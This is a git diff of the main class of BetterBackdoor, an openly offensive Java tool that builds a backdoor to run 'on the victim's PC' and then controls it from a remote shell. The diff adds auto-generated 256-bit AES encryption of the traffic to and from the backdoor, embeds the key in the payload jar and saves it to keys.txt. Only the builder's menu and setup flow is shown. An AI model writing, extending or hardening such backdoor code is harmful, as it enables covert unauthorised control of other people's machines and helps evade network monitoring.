@@ -2,12 +2,17 @@ package dev.thatcherclough.betterbackdoor;
 
 import java.io.File;
 import java.nio.file.Paths;
+import java.security.NoSuchAlgorithmException;
+import java.util.Base64;
+import java.util.Objects;
 import java.util.Scanner;
 
 import dev.thatcherclough.betterbackdoor.backend.Utils;
 import dev.thatcherclough.betterbackdoor.shell.Shell;
 
 import org.springframework.boot.autoconfigure.SpringBootApplication;
+
+import javax.crypto.*;
 
 @SpringBootApplication
 public class BetterBackdoor {
@@ -33,28 +38,43 @@ public class BetterBackdoor {
 		System.out.println("[1] Open backdoor shell");
 		String choice = getInput("op01");
 		if (choice.equals("0")) {
-			System.out.println("Would you like this backdoor to operate within a single network, LAN, "
-					+ "or over the internet, WAN (requires port forwarding):");
-			System.out.println("[0] LAN");
-			System.out.println("[1] WAN (requires port forwarding)");
-			String ipType = getInput("op01").equals("0") ? "internal" : "external";
-
-			boolean jre = false;
-			if (os.contains("Windows")) {
-				System.out.println(
-						"Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java installed?" +
-								"(y/n):");
-				jre = Boolean.parseBoolean(getInput("yn"));
-			} else
-				System.out.println(
-						"If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\n"
-								+ "in the current working directory create folder 'jre' containing 'bin' and 'lib' directories from a Windows JRE distribution.\n");
-
-			System.out.println("Press ENTER to create backdoor...");
-			sc.nextLine();
-			System.out.println("Creating...\n");
 			try {
-				Setup.create(jre, ipType);
+				System.out.println("Would you like this backdoor to operate within a single network, LAN, or over the internet, WAN (requires port forwarding):");
+				System.out.println("[0] LAN");
+				System.out.println("[1] WAN (requires port forwarding)");
+				String ipType = getInput("op01").equals("0") ? "internal" : "external";
+
+				String encryptionKey = null;
+				System.out.println("Would you like to encrypt data sent to and from the backdoor using an automatically generated 256 bit AES encryption key?(y/n):");
+				boolean encrypt = Boolean.parseBoolean(getInput("yn"));
+				if (encrypt) {
+					KeyGenerator keyGenerator;
+					try {
+						keyGenerator = KeyGenerator.getInstance("AES");
+					} catch (NoSuchAlgorithmException e) {
+						throw new Exception("Could not generate encryption key.");
+					}
+					Objects.requireNonNull(keyGenerator).init(256);
+					encryptionKey = Base64.getEncoder().encodeToString(keyGenerator.generateKey().getEncoded());
+					System.out.println("Automatically generated key: " + encryptionKey + "\n");
+				}
+
+				boolean jre = false;
+				if (os.contains("Windows")) {
+					System.out.println(
+							"Would you like to package the Java Runtime Environment from your computer with the backdoor\nso it can be run on computers without Java " +
+									"installed?" +
+									"(y/n):");
+					jre = Boolean.parseBoolean(getInput("yn"));
+				} else
+					System.out.println(
+							"If you would like to package a Java Runtime Environment with the backdoor so it can be run on computers without Java,\n"
+									+ "in the current working directory create folder 'jre' containing 'bin' and 'lib' directories from a Windows JRE distribution.\n");
+
+				System.out.println("Press ENTER to create backdoor...");
+				sc.nextLine();
+				System.out.println("Creating...\n");
+				Setup.create(jre, ipType, encryptionKey);
 				System.out.println("Created!\n");
 				if (ipType.equals("external"))
 					System.out.println(
@@ -65,6 +85,13 @@ public class BetterBackdoor {
 								+ "If a JRE is packaged with the backdoor, execute run.bat, otherwise execute run.jar.\n"
 								+ "This will start the backdoor on the victim's PC.\n"
 								+ "To control the backdoor, return to BetterBackdoor and run option 1 at start.\n");
+				if (encrypt) {
+					String keysFilepath = System.getProperty("user.dir") + File.separator + "keys.txt";
+					System.out.println("***IMPORTANT***\nEncryption key: " + encryptionKey + "\nThe encryption key is stored both inside of run.jar (the backdoor) and in '"
+							+ keysFilepath + "' on the current machine.\nIf 'keys.txt' gets deleted, you will be given an option to manually input the key when " +
+							"connecting to the backdoor.\nWithout this key you will not be able to control the backdoor.\n");
+				}
+
 				System.out.println("Press ENTER to exit...");
 				sc.nextLine();
 			} catch (Exception e) {
